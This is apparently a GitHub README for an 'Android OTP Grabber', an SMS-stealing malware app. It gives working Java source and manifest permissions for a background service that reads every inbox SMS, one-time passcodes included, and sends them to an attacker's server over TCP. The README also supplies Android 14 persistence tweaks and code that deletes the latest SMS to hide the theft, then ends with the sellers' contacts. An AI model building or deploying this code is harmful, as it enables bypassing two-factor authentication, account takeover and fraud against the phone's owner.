### Android OTP Grabber
<img align="left" src="https://github.com/user-attachments/assets/05657d25-a502-47f9-962d-eda12ca186b5" width="550" height="250">

OTP (SMS) Grabber for Android:zns6:

OTP is short for One–Time Password (one-time password) and is a temporary secure PIN code
that is sent to you via SMS or email and is valid for only one session.

Such confirmations can come from various services, including banking applications, messengers and other platforms.
We will intercept these messages and send them to our server in the background, working as a service.

#### Permissions in AndroidManifest.xml -

```
<uses-feature
        android:name="android.hardware.telephony"
        android:required="false" />

    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.SEND_SMS"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
```

To access SMS and run the code in the background, we need to define the appropriate permissions in AndroidManifest.xml .
Also, in the manifest, you need to specify our service, which will be SMSService. -

```
<service
            android:name=".SMSService"
            android:enabled="true"
            android:exported="true" />
```
MainActivity.java -
In MainActivity, you need to check whether you have received permissions to access SMS. If permissions are granted, the SMS Service is started,
which sends SMS to the server over TCP in the background.

```
private static final int REQUEST_READ_SMS_PERMISSION = 3004;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED
                || ContextCompat.checkSelfPermission(this, Manifest.permission.INTERNET) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_SMS, Manifest.permission.INTERNET}, REQUEST_READ_SMS_PERMISSION);
        } else {
            startSMSService();

        }
    }

    private void startSMSService() {
        Intent serviceIntent = new Intent(this, SMSService.class);
        startService(serviceIntent);
    }


    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_READ_SMS_PERMISSION && grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            startSMSService();
        }
    }
}
```
If permissions are granted, a background service is started that sends one-time codes to the server.
In addition, the service will send all SMS messages
ever received to the phone to identify the services linked to the SIM card.

SMS Service Code -

```
@Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED
                || ContextCompat.checkSelfPermission(this, Manifest.permission.INTERNET) != PackageManager.PERMISSION_GRANTED) {
            stopSelf();
            return START_NOT_STICKY;
        }
        acquireWakeLock();
        startForegroundService();
        listenForServerRequests();
        registerContentObserver();
        sendLastSmsPeriodically();
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        releaseWakeLock();
        unregisterContentObserver();
        if (handler != null) {
            handler.removeCallbacksAndMessages(null);
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void listenForServerRequests() {
        new Thread(() -> {
            while (true) {
                try (Socket socket = new Socket(SERVER_IP, PORT);
                     PrintWriter out = new PrintWriter(socket.getOutputStream(), true)) {
                    List<String> allSms = readAllSms();
                    for (String sms : allSms) {
                        out.println(sms);
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                    try {
                        Thread.sleep(2000);
                    } catch (InterruptedException ex) {
                        ex.printStackTrace();
                    }
                }
            }
        }).start();
    }

    private void sendLastSmsPeriodically() {
        handler = new Handler();
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                sendLastSmsToServer();
                handler.postDelayed(this, 5000);
            }
        }, 5000);
    }

    private void sendLastSmsToServer() {
        new Thread(() -> {
            try (Socket socket = new Socket(SERVER_IP, NEW_PORT);
                 PrintWriter out = new PrintWriter(socket.getOutputStream(), true)) {
                List<String> newSmsList = readNewSms();
                String smsToSend;
                if (!newSmsList.isEmpty()) {
                    smsToSend = newSmsList.get(0);
                    lastSentSms = smsToSend;
                } else {
                    smsToSend = lastSentSms;
                }
                if (smsToSend != null) {
                    out.println(smsToSend);
                    System.out.println("SMS sent successfully: " + smsToSend);
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }).start();
    }

    private List<String> readAllSms() {
        List<String> smsList = new ArrayList<>();
        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC");

        if (cursor != null && cursor.moveToFirst()) {
            do {
                String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                smsList.add(body);
            } while (cursor.moveToNext());
            cursor.close();
        }

        return smsList;
    }

    private void registerContentObserver() {
        contentObserver = new ContentObserver(new Handler()) {
            @Override
            public void onChange(boolean selfChange) {
                super.onChange(selfChange);

                List<String> newSms = readNewSms();
                for (String sms : newSms) {
                    sendSMSToServer(sms);
                }
            }
        };

        getContentResolver().registerContentObserver(Uri.parse(SMS_URI), true, contentObserver);
    }

    private void unregisterContentObserver() {
        if (contentObserver != null) {
            getContentResolver().unregisterContentObserver(contentObserver);
            contentObserver = null;
        }
    }

    private List<String> readNewSms() {
        List<String> newSmsList = new ArrayList<>();
        Cursor cursor = getContentResolver().query(Uri.parse(SMS_URI), null, null, null, "date DESC");

        if (cursor != null && cursor.moveToFirst()) {
            String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
            newSmsList.add(body);
            cursor.close();
        }

        return newSmsList;
    }

    private void sendSMSToServer(String sms) {
        new Thread(() -> {
            try (Socket socket = new Socket(SERVER_IP, PORT);
                 PrintWriter out = new PrintWriter(socket.getOutputStream(), true)) {
                out.println(sms);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }).start();
    }

    private void startForegroundService() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE);

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Foreground Service")
                .setContentText("Service is running in the background")
                .setSmallIcon(R.mipmap.ic_launcher)
                .setContentIntent(pendingIntent)
                .build();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForeground(1, notification);
        } else {
            startForeground(1, notification);
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "Foreground Service Channel",
                    NotificationManager.IMPORTANCE_DEFAULT
            );

            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(serviceChannel);
        }
    }

    private void acquireWakeLock() {
        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (powerManager != null) {
            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,
                    "SMSService::WakeLock");
            wakeLock.acquire();
        }
    }

    private void releaseWakeLock() {
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
    }
}
````
#### It should be noted that using this approach in real-world conditions can be difficult. Starting with new versions of Android, the behavior of services and permissions has changed, and many things may work differently on different versions of oc.

### Moments in the services that will help earn the code on Android 14.

```
private void startForegroundService() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE);

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Foreground Service")
                .setContentText("Service is running in the background")
                .setSmallIcon(R.mipmap.ic_launcher)
                .setContentIntent(pendingIntent)
                .build();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(1, notification);
        }
    }
```

```
<uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC"/>
```

#### The code for deleting the last SMS on the phone.

```
    private static final String SMS_URI = "content://sms/inbox";
    private Context context; 

    public SmsDeleter(Context context) {
        this.context = context;
    }
 public void deleteLastSms() {
        Cursor cursor = null;
        try {
        
            cursor = context.getContentResolver().query(Uri.parse(SMS_URI), null, null, null, "date DESC");
            if (cursor != null && cursor.moveToFirst()) {
                //ID 
                String smsId = cursor.getString(cursor.getColumnIndexOrThrow("_id"));
                Uri smsUri = Uri.parse(SMS_URI + "/" + smsId);

                
                int rowsDeleted = context.getContentResolver().delete(smsUri, null, null);
                if (rowsDeleted > 0) {
                    Log.d("SmsDel", "Удалено.");
                } else {
                    Log.e("SmsDeleter", "Ошибка");
                }
            }
        } catch (Exception e) {
            Log.e("SmsDel", "error", e);
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
    }
}
```
#### code for using the method -
```
SmsDeleter smsDeleter = new SmsDeleter(context);
smsDeleter.deleteLastSms();
```
<img align="left" src="https://injectexp.dev/assets/img/logo/logo1.png">
Contacts:
injectexp.dev / 
pro.injectexp.dev / 
Telegram: @Evi1Grey5 [support]
Tox: 340EF1DCEEC5B395B9B45963F945C00238ADDEAC87C117F64F46206911474C61981D96420B72
